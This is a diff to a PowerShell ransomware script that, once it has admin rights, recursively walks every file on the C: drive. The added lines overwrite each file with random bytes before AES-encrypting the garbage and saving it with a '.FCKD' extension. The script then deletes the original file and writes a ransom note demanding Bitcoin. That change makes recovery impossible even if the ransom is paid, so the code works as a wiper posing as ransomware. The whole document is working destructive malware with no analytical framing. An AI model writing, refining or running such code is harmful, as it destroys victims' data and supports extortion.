@@ -4,18 +4,22 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-$key = -join ((65..90) + (97..122) | Get-Random -Count 32 | % {[char]$_})
-$files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue
+$key = -join ((33..126) | Get-Random -Count 32 | % {[char]$_})
+$files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue | Sort-Object FullName -Descending
 foreach ($file in $files) {
     $content = [System.IO.File]::ReadAllBytes($file.FullName)
     if ($content) {
+        # Overwrite with garbage first
+        $trash = [byte[]] (1..$content.Length | % {Get-Random -Max 256})
+        [System.IO.File]::WriteAllBytes($file.FullName, $trash)
+        # Now encrypt
         $aes = New-Object System.Security.Cryptography.AesManaged
         $aes.Key = [Text.Encoding]::ASCII.GetBytes($key.Substring(0,32))
         $aes.IV = $aes.Key[0..15]
         $encryptor = $aes.CreateEncryptor()
-        $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
-        [System.IO.File]::WriteAllBytes($file.FullName + ".locked", $encrypted)
+        $encrypted = $encryptor.TransformFinalBlock($trash, 0, $trash.Length)
+        [System.IO.File]::WriteAllBytes($file.FullName + ".FCKD", $encrypted)
         Remove-Item -Path $file.FullName -ErrorAction SilentlyContinue
     }
 }
-Set-Content -Path "C:\RansomNote.txt" -Value "System’s screwed fast! Send 1 BTC to 1FakeBitcoinAddress for key: $key"
+Set-Content -Path "C:\YOU_ARE_SCREWED.txt" -Value "WOW! Everything’s gone! Send 1 BTC to 1FakeBitcoinAddress for key: $key or kiss it all goodbye!"
